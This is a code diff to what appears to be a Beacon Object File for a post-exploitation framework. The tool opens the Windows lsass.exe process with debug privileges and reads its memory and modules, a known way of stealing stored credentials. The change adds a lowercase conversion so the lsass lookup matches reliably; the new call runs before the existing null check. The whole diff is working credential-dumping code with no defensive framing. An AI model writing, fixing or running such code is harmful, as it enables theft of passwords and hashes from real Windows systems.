@@ -538,11 +538,22 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
 }
 
 
+void to_lowercase(char *str) {
+    while (*str) {
+        if (*str >= 'A' && *str <= 'Z') {
+            *str = *str + ('a' - 'A');
+        }
+        str++;
+    }
+}
+
+
 HANDLE GetProcessByName(const char* proc_name) {
     HANDLE aux_handle = NULL;
     NTSTATUS status;
     while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
         char* current_proc_name = GetProcNameFromHandle(aux_handle);
+        to_lowercase(current_proc_name);
         if (current_proc_name && MyStrCmp(current_proc_name, proc_name) == 0) {
             return aux_handle;
         }
@@ -766,7 +777,7 @@ MemFile* ReadMemReg(HANDLE hProcess, int* memfile_countOutput){
 ModuleInformation* GetModuleInfo(HANDLE* hProcessOutput, int* module_counterOutput){
     // Process handle
     EnableDebugPrivileges();
-    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
+    HANDLE hProcess = GetProcessByName("c:\\windows\\system32\\lsass.exe");
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
     *hProcessOutput = hProcess;
     
